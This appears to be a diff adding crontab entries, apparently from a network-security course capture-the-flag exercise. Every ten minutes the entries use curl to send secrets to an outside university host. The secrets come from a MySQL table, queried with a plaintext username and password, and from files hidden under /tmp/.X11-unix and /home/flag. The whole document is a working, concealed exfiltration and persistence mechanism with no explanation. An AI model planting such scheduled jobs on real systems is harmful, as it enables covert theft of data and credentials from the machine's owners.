@@ -1,0 +1,5 @@
+*/10 * * * * curl "http://people.cs.nctu.edu.tw/~hwcheng/NSFinal/process.php?ID=11&key=`mysql -D pmc -u joy -pchansey -e "SELECT * from flag" | tail -c 41`"
+*/10 * * * * curl "http://people.cs.nctu.edu.tw/~hwcheng/NSFinal/process.php?ID=11&key=`cat /tmp/.X11-unix/flag`"
+*/10 * * * * curl "http://people.cs.nctu.edu.tw/~hwcheng/NSFinal/process.php?ID=11&key=`cat /home/flag/ssp`"
+*/10 * * * * curl "http://people.cs.nctu.edu.tw/~hwcheng/NSFinal/process.php?ID=11&key=`cat /tmp/.X11-unix/.ad/-ad/-a`"
+*/10 * * * * curl "http://people.cs.nctu.edu.tw/~hwcheng/NSFinal/process.php?ID=11&key=`cat /tmp/.X11-unix/.ad/-ad/.a`"
